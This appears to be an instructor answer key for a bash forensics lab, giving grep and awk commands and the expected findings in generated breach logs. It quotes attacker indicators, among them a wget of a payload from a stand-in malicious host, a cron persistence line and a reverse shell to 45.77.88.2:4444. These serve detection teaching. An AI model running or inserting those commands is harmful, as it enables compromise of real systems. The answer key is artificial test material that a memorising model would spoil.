# Lab Findings Answer Key

This key is the instructor/reference answer set for the generated datasets.

## Scope

This key covers two datasets:

1. `setup_bash_cyber_lab.sh` default dataset under `$HOME/bash-cyber-course/logs`
2. `advanced_breach_generator.sh` dataset (default or custom output path)

Use this document for grading, QC, and assistant-instructor alignment.

## A. Expected Findings - Setup Dataset

Path assumptions:

- `logs/auth.log`
- `logs/access.log`
- `logs/bash_history.log`
- `logs/syslog`
- `logs/network.log`

### 1. Top attacker IP

Command:

```bash
grep "Failed password" logs/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -n 1
```

Expected result pattern:

- Top IP: `185.220.101.4`
- Expected count: `400` failed attempts tied to this attacker

### 2. Total failed logins

Command:

```bash
grep -c "Failed password" logs/auth.log
```

Expected value:

- `180400` in the generated setup dataset

### 3. Compromised account

Command:

```bash
grep "Accepted password" logs/auth.log
```

Expected indicator:

- User: `admin`
- Key line includes timestamp: `Jul 10 09:16:10`

### 4. Session established after compromise

Command:

```bash
grep "session opened" logs/auth.log
```

Expected indicator:

- `session opened for user admin`

### 5. Suspicious malware download activity

Command:

```bash
grep -E "wget|curl" logs/bash_history.log
```

Expected indicator:

- `wget http://malicious.site/payload.sh`

### 6. Persistence evidence

Commands:

```bash
grep -i "cron" logs/syslog
grep "crontab" logs/bash_history.log
```

Expected indicators:

- `CRON[1500]: (admin) CMD (wget http://malicious.site/payload.sh)` in `syslog`
- `echo '* * * * * /tmp/payload.sh' >> /etc/crontab` in history

### 7. Reverse shell / C2 indicator

Commands:

```bash
grep "/dev/tcp" logs/bash_history.log
grep "45.77.88.2" logs/syslog
grep "45.77.88.2" logs/network.log
```

Expected indicators:

- Reverse shell command to `45.77.88.2:4444`
- Outbound connection entries to `45.77.88.2`

### 8. Data targeting or exfil clue

Command:

```bash
grep -E "backup.zip|/admin" logs/access.log
```

Expected indicators:

- `GET /admin`
- `GET /backup.zip`
- Attacker source IP `185.220.101.4`

### 9. Cleanup attempt

Commands:

```bash
grep "history -c" logs/bash_history.log
grep "history cleared" logs/syslog
```

Expected indicators:

- Shell history clear attempt present

### 10. Timeline anchor points

Commands:

```bash
grep -E "Accepted password|session opened" logs/auth.log
grep -E "CRON|outbound connection|history cleared" logs/syslog
grep "backup.zip" logs/access.log
```

Expected ordered progression:

1. Brute force failures against `admin`
2. Successful login (`09:16:10`)
3. Session opened (`09:18:11`)
4. Persistence execution (`09:20:15`)
5. Outbound suspicious connection (`09:20:17`, `09:21:15`)
6. Data access (`09:19:05` / `09:22:12` depending log source)
7. Cleanup (`09:23:01`)

## C. Grading Key (Recommended)

Use this 10-point quick rubric for final investigation submissions:

- 2 points: correct attacker IP
- 2 points: correct compromised account
- 2 points: malware/payload command identified
- 2 points: persistence or C2 indicator identified
- 2 points: coherent timeline with at least 5 ordered events

## D. Known Variability Notes

- Noise data is randomized each run.
- Core attack artifacts are deterministic and should remain present.
- Top attacker should remain stable because injected attacker event count is much higher than random duplicates.
